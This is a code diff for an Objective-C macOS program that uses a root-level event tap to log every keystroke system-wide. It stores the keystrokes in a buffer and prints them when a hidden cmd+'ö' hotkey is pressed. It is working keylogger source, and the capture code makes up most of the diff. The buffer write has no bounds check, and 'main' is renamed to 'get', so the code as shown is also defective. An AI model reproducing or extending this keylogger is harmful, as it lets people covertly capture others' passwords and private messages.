@@ -38,13 +38,35 @@
 */
 
 // Imports
+#import <string.h>
 #import <Carbon/Carbon.h>
-#include <MacTypes.h>
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
 
+#define bufMax 40000
+
 // Create event tap
 static CFMachPortRef eventTap = NULL;
+static char buf[bufMax] = {0};
+static int bufIndex = 0;
+
+// Colourful messages
+typedef struct {
+    const NSString* red;
+    const NSString* blue;
+    const NSString* reset;
+} Colours;
+const static Colours colours = {
+    @"\x1b[31;1m",
+    @"\x1b[34;1m",
+    @"\x1b[0m",
+};
+
+// Fn decl
+NSString* keyCodeToString(CGEventRef event, CGEventType type);
+NSMutableString* extractKeyModifiers(CGEventRef event);
+CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref);
+void moddump();
 
 /* getKey: Map the keycode to a char
  * @PARAM CGEventRef: event
@@ -100,7 +122,7 @@ NSMutableString* extractKeyModifiers(CGEventRef event) {
     }
     // Handlers: alt
     if(!!(flags & kCGEventFlagMaskAlternate) == YES) {
-        [keyModifiers appendString:@"alt "];
+        [keyModifiers appendString:@"alt"];
     }
     // Handlers: command
     if(!!(flags & kCGEventFlagMaskCommand) == YES) {
@@ -108,13 +130,12 @@ NSMutableString* extractKeyModifiers(CGEventRef event) {
     }
     // Handlers: shift
     if(!!(flags & kCGEventFlagMaskShift) == YES) {
-        [keyModifiers appendString:@"shift "];
+        [keyModifiers appendString:@"shift"];
     }
     // Handlers: lock
     if(!!(flags & kCGEventFlagMaskAlphaShift) == YES) {
-        [keyModifiers appendString:@"caps-lock "];
+        [keyModifiers appendString:@"caps"];
     }
-    // return
     return keyModifiers;
 }
 
@@ -125,9 +146,7 @@ NSMutableString* extractKeyModifiers(CGEventRef event) {
  * @PARAM void*: ref 
  * @RVal CGEventRef */
 CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *ref) {
-    // set vars 
-    CGPoint loc = {0};
-    CGKeyCode code = 0;
+    // Set vars
     NSMutableString* keyMods = nil;
     // match type
     switch(type) {
@@ -153,47 +172,61 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         // event tap timeout
         case kCGEventTapDisabledByTimeout:
             CGEventTapEnable(eventTap, true);
-            printf("Event tap timed out: restarting tap\n");
+            printf("%sErr ::%s Event tap timed out -> restarting tap\n", colours.red.UTF8String, colours.reset.UTF8String);
             return event;
         default:
-            printf("unknown (%d)\n", type);
+            printf("%sUnknown%s\n", colours.red.UTF8String, colours.reset.UTF8String);
     }
     // Get keycode
-    if( (kCGEventKeyDown == type) || (kCGEventKeyUp == type) ) {
-        code = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
-        // chgck modifiers
-        if(keyMods.length != 0) {
-            printf("key modifiers: %s\n", keyMods.UTF8String);
+    if ((kCGEventKeyDown == type) || (kCGEventKeyUp == type)) {
+        // Hanle special keys
+        // shift, ctrl, alt, cmd, caps
+        if ([keyMods rangeOfString:@"cmd"].location != NSNotFound && [keyCodeToString(event, type) isEqualToString:@"ö"]) {
+            moddump();
         }
-        //dbg msg
-        printf("+keycode: %s\n", keyCodeToString(event, type).UTF8String);
+        // handle modifiers
+        if ([keyMods rangeOfString:@"shift"].location != NSNotFound || [keyMods rangeOfString:@"caps"].location != NSNotFound) {
+            sprintf(buf + bufIndex, "%s", [[keyCodeToString(event, type) uppercaseString] UTF8String]);
+        } else if ([keyMods rangeOfString:@"ctrl"].location != NSNotFound) {
+        } else if ([keyMods rangeOfString:@"alt"].location != NSNotFound) {
+        } else if ([keyMods rangeOfString:@"cmd"].location != NSNotFound) {
+        } else {
+            sprintf(buf + bufIndex, "%s", [keyCodeToString(event, type) UTF8String]);
+        }
+        bufIndex += strlen(buf + bufIndex);
     }
     // return
     return event;
+}
+
+/* moddump: dump buffer and exec */
+void moddump() {
+    printf("%s\n", buf);
+    bufIndex = 0;
+    memset(buf, 0, bufMax);
 }
 
 /* main: The main function 
  * @PARAM int: argc 
  * @PARAM char**: argv
  * @RVal int */
-int main(int argc, const char * argv[]) {
+void get() {
     // event mask + loop
     CGEventMask eventMask = 0;
     CFRunLoopSourceRef runLoopSource = NULL;
     //pool
     @autoreleasepool {
-        // startup msg 
-        printf("logged => logging...\n");
         // check for root
         if(geteuid() != 0) {
-            printf("ERROR: run as root\n");
+            printf("%sErr ::%s Service must be run as root\n", colours.red.UTF8String, colours.reset.UTF8String);
             goto stop;
         }
+        printf("%sLogged ::%s logging...\n", colours.blue.UTF8String, colours.reset.UTF8String);
         // init event tap and mask
-        eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
+        eventMask = CGEventMaskBit(kCGEventKeyDown);
         eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, eventCallback, NULL);
         if(eventTap == NULL) {
-            printf("ERROR: failed to create event tap\n");
+            printf("%sErr ::%s failed to create event tap\n", colours.red.UTF8String, colours.reset.UTF8String);
             goto stop;
         }
         // setup runloop
@@ -214,6 +247,4 @@ stop:
         CFRelease(runLoopSource);
         runLoopSource = NULL;
     }
-    // return
-    return 0;
 }
